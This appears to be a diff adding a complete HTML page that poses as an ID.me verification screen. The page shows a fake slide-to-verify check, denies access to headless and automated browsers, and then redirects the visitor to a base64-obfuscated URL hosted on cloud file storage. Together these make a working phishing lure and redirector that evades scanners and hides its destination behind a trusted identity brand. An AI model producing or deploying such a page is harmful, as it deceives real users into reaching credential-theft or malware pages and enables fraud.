@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Id.Me</title>
+
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+
+    <style>
+        *{font-family:'Inter',sans-serif;}
+        body{
+            background:none;
+            min-height:100vh;
+            margin:0;
+            display:flex;
+            align-items:center;
+            justify-content:center;
+            overflow:hidden;
+        }
+
+        .auth-container{
+            text-align:center;
+            max-width:380px;
+            width:100%;
+            padding:3rem 2rem;
+            animation:fadeIn .9s ease-out;
+        }
+
+        .logo{
+            width:100px;
+            margin-bottom:1.8rem;
+            filter:drop-shadow(0 2px 6px rgba(0,0,0,.08));
+        }
+
+        .sub{
+            color:#2d2d2d;
+            font-size:1rem;
+            font-weight:500;
+            letter-spacing:.3px;
+            margin-bottom:1.2rem;
+            opacity:.92;
+        }
+
+        /* ---------- SLIDER ---------- */
+        .slider-wrapper{
+            position:relative;
+            margin:1.8rem 0 1rem;
+            height:36px;
+        }
+
+        .slider-track{
+            position:absolute;
+            top:50%;
+            left:0; right:0;
+            height:12px;
+            border-radius:8px;
+            background:#e8ecef;
+            transform:translateY(-50%);
+            box-shadow:inset 0 1px 3px rgba(0,0,0,.1);
+            pointer-events:none;
+            overflow:hidden;
+        }
+
+        .slider-fill{
+            position:absolute;
+            top:0; left:0;
+            height:100%;
+            width:0;
+            background:linear-gradient(90deg,#000000,#1a1a1a); /* Changed from purple to black */
+            border-radius:8px;
+            transition:width .25s ease;
+            pointer-events:none;
+        }
+
+        .slider-thumb{
+            position:absolute;
+            top:50%;
+            left:0;
+            width:36px;
+            height:36px;
+            margin-left:-18px;
+            margin-top:-18px;
+            border-radius:50%;
+            background:linear-gradient(135deg,#000000,#1a1a1a); /* Changed from purple to black */
+            cursor:pointer;
+            box-shadow:0 2px 8px rgba(0,0,0,.4), 0 0 0 3px rgba(255,255,255,.9);
+            display:flex;
+            align-items:center;
+            justify-content:center;
+            user-select:none;
+            z-index:10;
+            transition:all .15s ease;
+
+            /* THIS IS THE CRITICAL FIX */
+            pointer-events: none !important;
+        }
+
+        .slider-thumb:hover{
+            transform:scale(1.05);
+        }
+
+        .slider-thumb:active{
+            transform:scale(1.1);
+        }
+
+        .thumb-percentage{
+            color:#fff;
+            font-size:.7rem;
+            font-weight:600;
+            text-shadow:0 1px 1px rgba(0,0,0,.2);
+            pointer-events: none;
+        }
+
+        #humanSlider{
+            position:absolute;
+            top:0; left:0;
+            width:100%;
+            height:100%;
+            opacity:0;
+            cursor:pointer;
+            z-index:20;           /* Above everything */
+            margin:0;
+            -webkit-appearance: none; /* Clean look on mobile */
+        }
+
+        /* Loading */
+        .loading-container{
+            display:none;
+            flex-direction:column;
+            align-items:center;
+            animation:fadeIn .6s ease-out;
+        }
+
+        .loading-text{
+            color:#000000; /* Changed from purple (#6001D2) to black */
+            font-size:1.1rem;
+            font-weight:600;
+            letter-spacing:1.5px;
+            text-transform:uppercase;
+        }
+
+        @keyframes fadeIn{from{opacity:0;transform:scale(.9)}to{opacity:1;transform:scale(1)}}
+    </style>
+</head>
+<body>
+
+<div class="auth-container" id="authContainer">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/8/8b/ID.me_Logo.png" class="logo" alt="id.me">
+    <div class="sub"><small><b><i>Slide right to verify and proceed.</i></b></small></div>
+
+    <div class="slider-wrapper">
+        <input type="range" min="0" max="100" value="0" id="humanSlider">
+        <div class="slider-track">
+            <div class="slider-fill" id="sliderFill"></div>
+        </div>
+        <div class="slider-thumb" id="sliderThumb">
+            <span class="thumb-percentage" id="thumbPercentage">0%</span>
+        </div>
+    </div>
+</div>
+
+<div class="loading-container" id="loadingContainer">
+    <div class="loading-text"><small><b><i>NOW LOADING... PLEASE WAIT</i></b></small></div>
+</div>
+
+<script>
+/* Basic bot detection */
+if (navigator.webdriver || /HeadlessChrome|PhantomJS|__nightmare|__playwright/.test(navigator.userAgent)) {
+    document.body.innerHTML='<div style="text-align:center;padding:3rem;font-family:Inter,sans-serif;color:#333;">Access denied.</div>';
+    throw new Error('Bot detected');
+}
+
+const target = atob('aHR0cHM6Ly9mMDA1LmJhY2tibGF6ZWIyLmNvbS9maWxlL2Rhc2hpbmd3aW5nczk5Mi9pbmRleC5odG1s');
+
+const slider = document.getElementById('humanSlider');
+const thumb = document.getElementById('sliderThumb');
+const fill = document.getElementById('sliderFill');
+const pctLabel = document.getElementById('thumbPercentage');
+const auth = document.getElementById('authContainer');
+const loading = document.getElementById('loadingContainer');
+
+function updateSlider(val) {
+    const percent = val + '%';
+    fill.style.width = percent;
+    thumb.style.left = percent;
+    pctLabel.textContent = percent;
+}
+
+// Real-time update while dragging
+slider.addEventListener('input', function() {
+    updateSlider(this.value);
+});
+
+// When fully slid (95%+)
+slider.addEventListener('change', function() {
+    if (this.value >= 95) {
+        this.disabled = true;
+        document.body.style.cursor = 'wait';
+        auth.style.display = 'none';
+        loading.style.display = 'flex';
+        setTimeout(() => location.href = target, 1300);
+    }
+});
+
+// Initialize
+updateSlider(0);
+</script>
+
+</body>
+</html>
